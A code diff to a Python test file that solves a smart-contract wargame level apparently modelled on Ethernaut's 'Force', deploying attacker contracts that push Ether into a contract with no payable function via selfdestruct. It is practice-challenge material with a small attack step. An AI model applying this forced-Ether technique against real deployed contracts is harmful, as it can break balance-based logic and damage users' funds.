@@ -1,7 +1,7 @@
 from wake.testing import *
 from tests.level_service import LevelService
 from pytypes.contracts.i07_force import Force
-# TODO You can import your our own smart contract(s) here.
+from pytypes.contracts.attacker.i07_transfer import ForceTransfer, FasterForceTransfer
 
 @default_chain.connect()
 def test_level_07():
@@ -11,7 +11,7 @@ def test_level_07():
     service.check_level_07(contract)
 
 def do_level_07_solution(contract: Force):
-    # TODO Force this contract to take some Ether.
-    # TODO You can import your our own smart contract(s) here.
-    # TODO Code here ...
-    pass
+    # Problem: Selfdestruct and minting transfer Ether directly 
+    attacker1 = ForceTransfer.deploy()
+    attacker1.push(contract, value=30)
+    attacker2 = FasterForceTransfer.deploy(contract, value=100)
